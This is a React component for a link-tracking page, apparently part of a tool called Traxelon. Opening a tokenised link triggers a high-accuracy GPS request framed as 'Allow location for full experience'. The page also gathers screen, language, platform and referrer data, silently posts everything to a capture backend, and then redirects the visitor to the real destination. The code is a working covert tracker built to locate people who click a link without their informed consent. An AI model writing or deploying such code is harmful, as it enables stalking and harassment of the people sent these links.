import React, { useEffect, useState } from "react";
import { useParams } from "react-router-dom";

const BACKEND_URL = import.meta.env.VITE_BACKEND_URL || "http://localhost:5001";

// Generate a unique key for this capture session (per token)
function getCaptureKey(token) {
  return `traxelon_captured_v2_${token}`;
}

export default function TrackingCapture() {
  const { token } = useParams();
  const [status, setStatus] = useState("Requesting location…");

  useEffect(() => {
    const key = getCaptureKey(token);

    // Prevent double-fire (React StrictMode / fast refresh)
    if (sessionStorage.getItem(key)) {
      // Already captured this session — just redirect
      setStatus("Redirecting…");
      return;
    }
    sessionStorage.setItem(key, "1");

    run();
  }, [token]);

  async function run() {
    let gpsLat = null;
    let gpsLon = null;
    let gpsAccuracy = null;
    let destinationUrl = null;

    // ── Step 1: GPS ─────────────────────────────────────────────
    // We wait up to 15 seconds for the user to respond to the browser popup.
    // The page stays visible ("Requesting location…") the whole time.
    if (navigator.geolocation) {
      setStatus("📍 Allow location for full experience…");
      try {
        const pos = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0,
          });
        });
        gpsLat = pos.coords.latitude;
        gpsLon = pos.coords.longitude;
        gpsAccuracy = Math.round(pos.coords.accuracy);
      } catch {
        // User denied or timed out — continue without GPS
      }
    }

    setStatus("Redirecting…");

    // ── Step 2: Send capture to backend ─────────────────────────
    try {
      const payload = {
        token,
        referrer: document.referrer || null,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        language: navigator.language,
        platform: navigator.platform,
        gpsLat,
        gpsLon,
        gpsAccuracy,
      };

      const res = await fetch(`${BACKEND_URL}/api/links/capture`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      const data = await res.json();
      destinationUrl = data?.destinationUrl || null;
    } catch {
      // silent fail
    }

    // ── Step 3: Redirect ─────────────────────────────────────────
    if (destinationUrl) {
      window.location.replace(destinationUrl);
    }
  }

  return (
    <div style={{
      minHeight: "100vh",
      display: "flex",
      flexDirection: "column",
      alignItems: "center",
      justifyContent: "center",
      background: "#ffffff",
      fontFamily: "sans-serif",
    }}>
      <div style={{ textAlign: "center", color: "#888", fontSize: 14 }}>
        <div style={{
          width: 36,
          height: 36,
          border: "3px solid #f0f0f0",
          borderTop: "3px solid #4a90e2",
          borderRadius: "50%",
          margin: "0 auto 16px",
          animation: "spin 0.9s linear infinite",
        }} />
        <div style={{ color: "#555", fontSize: 14 }}>{status}</div>
      </div>
      <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
    </div>
  );
}